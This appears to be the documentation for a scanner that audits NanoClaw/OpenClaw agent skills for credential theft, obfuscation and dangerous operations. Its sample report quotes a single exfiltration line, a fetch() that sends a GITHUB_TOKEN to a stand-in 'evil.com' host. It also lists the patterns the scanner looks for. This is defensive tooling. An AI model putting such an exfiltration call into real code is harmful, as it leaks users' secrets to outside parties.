# Security Audit Skill

Automated security scanning for NanoClaw/OpenClaw skills. Detects credential exfiltration, malicious network patterns, code obfuscation, and dangerous operations.

## When to Use

- Before installing a new skill from ClawdHub or another source
- When reviewing skill code for security issues
- After updating a skill to verify no malicious code was introduced
- When contributing to awesome-openclaw-skills (audit before submission)

## What It Detects

### Critical Issues (Auto-fail)
- **Credential exfiltration**: Sending API keys, tokens, or secrets to external servers
- **Code obfuscation**: Base64-encoded payloads, eval() abuse, dynamic code construction
- **Process injection**: Shell command execution with secrets or user input
- **System file modification**: Attempts to modify /etc, /bin, /usr, or other system directories
- **Directory traversal**: Reading secrets or config files outside the workspace

### High-Severity Warnings
- **Undocumented network access**: External API calls not mentioned in SKILL.md
- **Dynamic URLs**: fetch() or axios with variable URLs
- **Environment enumeration**: Iterating over all environment variables
- **Shell execution**: Spawning /bin/sh or /bin/bash
- **Dynamic imports**: Loading modules with computed names

### Medium-Severity Issues
- **Sensitive file access**: Reading files named 'secret', 'token', 'password', etc.
- **Workspace escape**: Writing files outside the workspace directory
- **Process spawn with user input**: Potential command injection
- **File deletion**: Unlink or rm operations
- **Permission modification**: chmod or chown calls

### Low-Severity / Informational
- **Unencrypted HTTP**: Using http:// instead of https://
- **Console logging secrets**: Printing sensitive data to console
- **Runtime dependency installation**: npm install or git clone at runtime
- **Background processes**: setInterval() or long setTimeout()

## Usage

### From Command Line

```bash
# Audit a skill directory
node .claude/skills/security-audit/scanner.cjs /path/to/skill

# Strict mode (fail on any warning)
node .claude/skills/security-audit/scanner.cjs /path/to/skill --strict

# JSON output
node .claude/skills/security-audit/scanner.cjs /path/to/skill --json

# Quiet mode (summary only)
node .claude/skills/security-audit/scanner.cjs /path/to/skill --quiet
```

### From Code

```javascript
const { auditSkill } = require('./scanner.cjs');

const result = await auditSkill('/path/to/skill', {
  strictMode: false,
  reportFormat: 'markdown',  // or 'json'
  verbose: true
});

console.log(result.report);
console.log('Status:', result.status);  // 'PASS' | 'FAIL' | 'REVIEW_NEEDED'
console.log('Risk Score:', result.riskScore);  // 0-100
```

### Exit Codes

- **0**: PASS — Skill appears safe
- **1**: FAIL — Critical issues detected, do not install
- **2**: REVIEW_NEEDED — Manual review recommended
- **3**: Error — Audit failed to complete

## Example Output

```markdown
# Security Audit Report: example-skill

**Skill**: example-skill
**Audited**: 2026-02-15T04:32:00Z
**Risk Score**: 85/100
**Verdict**: ❌ FAIL

## Summary
This skill contains **2 critical**, **1 high** security issues.

## Critical Findings

### 1. Credential exfiltration detected
**File**: `impl.js:42`
**Severity**: 🔴 CRITICAL

```javascript
fetch("https://collector.evil.com", { body: process.env.GITHUB_TOKEN })
```

**Remediation**: Remove external network calls that transmit credentials.

---

## Recommendation
**DO NOT INSTALL** this skill until critical issues are resolved.
```

## Detection Patterns

The scanner uses regex-based pattern matching combined with contextual analysis:

1. **Pattern Matching**: Scans code for known malicious constructs
2. **Context Checking**: Verifies external domains are documented in SKILL.md
3. **Risk Scoring**: Aggregates findings into overall risk score (0-100)
4. **Verdict Generation**: PASS / FAIL / REVIEW_NEEDED based on findings

## Limitations

- **Not a complete security analysis**: This tool detects common patterns but cannot catch all malicious behavior
- **Regex-based**: May miss obfuscated or novel attack patterns
- **No runtime analysis**: Only scans static code, doesn't execute the skill
- **Context-dependent patterns**: Some legitimate code may be flagged (false positives)

Always combine automated scanning with:
- Manual code review for critical skills
- Reputation checking (who wrote it, who audited it)
- Provenance verification (cryptographic signatures)

## Future Enhancements

- AST-based analysis (more accurate than regex)
- Runtime behavior monitoring
- Integration with skill provenance system (Isnad chains)
- Community reputation database
- Automated remediation suggestions
